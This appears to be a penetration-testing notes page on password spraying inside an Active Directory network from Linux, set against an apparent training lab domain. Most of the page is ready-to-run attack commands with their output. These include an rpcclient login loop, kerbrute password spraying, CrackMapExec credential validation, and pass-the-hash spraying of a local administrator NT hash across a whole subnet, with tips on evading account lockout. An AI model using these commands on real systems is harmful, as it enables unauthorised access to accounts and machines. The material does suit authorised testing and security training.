---
description: >-
  This page is for password spraying when we have access to a Linux host inside
  the internal network.
---

# Internal Spraying - From Linux

***

### Internal Password Spraying from a Linux Host

Once we have a wordlist it's time to execute an attack. There are many tools we can use to perform a password spraying attack as mentioned in previous sections. This page covers the best options in my opinion.



### Rpcclient

**Using a Bash one-liner for the Attack**

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```



### Kerbrute

```shell-session
attacker@kali$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds\
```

###

### CrackMapExec

We can filter the Logon Failures as shown in the command below.

```shell-session
attacker@kali$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

###

### Validating Credentials with CrackMapExec

Once we get hits with our password spraying attack, we can use CrackMapExec to validate the credentials againt a Domain Controller.

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
</strong>
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
</code></pre>



### Local Adiminstrator Password Reuse

If we obtain administrative access and the NTLM password hash (or cleartext password) of a local admin account, we should attempt this across the network. Password reuse along with common formats is widespread. For example: If the admin password found isn't working it's worth attempting a similar password. _**Example: $desktop%admin123 might be $server%@admin123**_



Sometimes we can retrieve the NTLM hash for the local admin from the SAM (Security Account Manager) Database. In this instance, we can spray the NT hash across the entire subnet (or multiple subnets).

_<mark style="color:red;">**NOTE:**</mark>_ The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.



### **Local Admin Spraying with CrackMapExec**

<pre class="language-shell-session"><code class="lang-shell-session"><strong>attacker@kali$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
</strong>
SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
</code></pre>
